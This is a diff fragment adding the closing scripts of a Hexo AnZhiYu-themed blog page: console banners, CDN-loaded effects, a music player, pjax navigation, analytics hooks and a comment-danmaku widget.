+    console.warn.bind(
+      console,
+      "%c ⚡ Powered by 安知鱼 %c 你正在访问 SpaceDraG0n 的博客.",
+      "color:white; background-color:#f0ad4e",
+      ""
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
+  );
+});</script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="post"></div><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
+</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><script async data-pjax src="/js/imgloaded.js?1"></script><script src="/custom/js/schedule.js"></script><script src="/custom/js/chineselunar.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/dist/fireworks.min.js"></script><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"]):not([href="/music/"]):not([href="/no-pjax/"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+  // removeEventListener scroll 
+  anzhiyu.removeGlobalFnEvent('pjax')
+  anzhiyu.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script><script>//- 留言板页面弹幕
+window.addEventListener('load', () => {
+  const getnaokuo_danmu = () => {
+    if (!window.location.pathname.startsWith('/comments/')) return; //- 判断是否是留言板页面
+    const naokuo_danmu = async () => {
+      const Danmaku = new EasyDanmaku({
+        page: '/comments/', //- 即留言板地址
+        el: '#danmu-wrap', //- 弹幕挂载节点
+        line: 5, //- 弹幕行数
+        speed: 20, //- 弹幕播放速度
+        hover: true, //- 鼠标hover时是否暂停播放弹幕
+        loop: false, //- 开启循环播放
+        colourful: true, //- 开启彩色弹幕
+        coefficient: 1.38, //- 弹幕密度系数
+        runtime: 10, //- 循环弹幕播放时长
+      });
+      try {
+        let danmuStore = saveToLocal.get('twikoo-danmu');
+        if (!danmuStore) {
+          const options = {
+            method: "POST",
+            body: JSON.stringify({
+              "event": "GET_RECENT_COMMENTS",
+              "includeReply": false,
+              "pageSize": 100
+            }),
+            headers: { 'Content-Type': 'application/json' }
+          }
+          danmuStore = [];
+          const response = await fetch(``, options);
+          if (response.ok) {
+            const { data } = await response.json();
+            //- console.info(data);
+            data.forEach(i => {
+              if (i.avatar == undefined) i.avatar = 'https://cravatar.cn/avatar/d615d5793929e8c7d70eab5f00f7f5f1?d=mp'
+              danmuStore.push({ avatar: i.avatar, content: i.nick + '：' + formatDanmaku(i.comment), url: i.url + '#' + i.id })
+            });
+            Danmaku.batchSend(danmuStore, true);
+            saveToLocal.set('twikoo-danmu', danmuStore, 0.5)
+          }
+          //- 格式化评论
+          function formatDanmaku(str) {
+            str = str.replace(/<\/*br>|[\s\uFEFF\xA0]+/g, '');
+            str = str.replace(/<img.*?>/g, '[图片]');
+            str = str.replace(/<a.*?>.*?<\/a>/g, '[链接]');
+            str = str.replace(/<pre.*?>.*?<\/pre>/g, '[代码块]');
+            str = str.replace(/<.*?>/g, '');
+            return str
+          }
+        } else {
+          Danmaku.batchSend(danmuStore, true);
+        }
+      } catch (err) {
+        console.error("Error fetching data:", err);
+      }
+
+      document.getElementById('danmu-Btn') && (document.getElementById('danmu-Btn').innerHTML = `<button class="hide-Btn" onclick="document.getElementById('danmu-wrap').classList.remove('hide-danmu')">显示弹幕</button> <button class="hide-Btn" onclick="document.getElementById('danmu-wrap').classList.add('hide-danmu')">隐藏弹幕</button>`)
+    }
+    (async () => {
+      if (typeof EasyDanmaku === 'function') {
+        await naokuo_danmu();
+      } else {
+        const easyDanmakuScript = await getScript('https://npm.onmicrosoft.cn/naokuo-blog@1.2.12/js/easy-Danmaku.js');
+        if (typeof EasyDanmaku === 'function') {
+          await naokuo_danmu();
+        } else {
+          console.error('EasyDanmaku function not found even after loading the script.');
+        }
+      }
+    })();
+  }
+  getnaokuo_danmu()
+  document.addEventListener('pjax:complete', getnaokuo_danmu)
+})</script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>
